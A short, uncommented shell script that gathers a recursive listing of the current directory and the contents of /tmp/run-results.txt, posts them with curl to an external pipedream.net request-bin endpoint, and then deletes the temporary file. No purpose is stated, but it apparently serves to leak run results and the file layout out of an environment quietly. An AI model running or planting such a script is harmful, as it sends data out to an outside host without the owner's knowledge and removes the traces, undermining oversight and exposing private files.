#!/bin/sh

rm /tmp/script_output_seba

echo $(ls -la -R .) > /tmp/file.txt
echo "-------------------" >> /tmp/file.txt
echo $(cat /tmp/run-results.txt) >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

rm /tmp/file.txt
